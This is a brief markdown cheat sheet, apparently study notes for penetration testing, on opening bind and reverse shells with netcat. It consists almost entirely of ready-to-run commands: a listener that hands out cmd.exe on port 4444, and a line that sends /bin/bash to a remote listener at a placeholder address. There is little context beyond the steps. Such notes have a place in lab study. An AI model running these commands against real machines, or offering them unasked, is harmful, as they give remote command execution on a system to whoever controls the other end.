# Netcat and Shells

## Bind Shell
Request shell from box

### Windows Box
Using netcat set a listener on port 4444 and using the -e command set it to push to cmd.exe

```nc -lvp 4444 -e cmd.exe```

### Linux Box
Now simply connect on that port and after a short wait you will be given the windows shell, which can be tested using ipconfig

```nc -nv IP.AD.DR.ESS 4444```

## Reverse Shell
Send shell to box

### Windows box
Setup a basic listener

```nc -lvp 4444```

### Linux Box
Send the shell to the listener, then check back on the windows box you should now be inside a linux shell

```nc -nv IP.AD.DR.ESS 4444 -e /bin/bash```
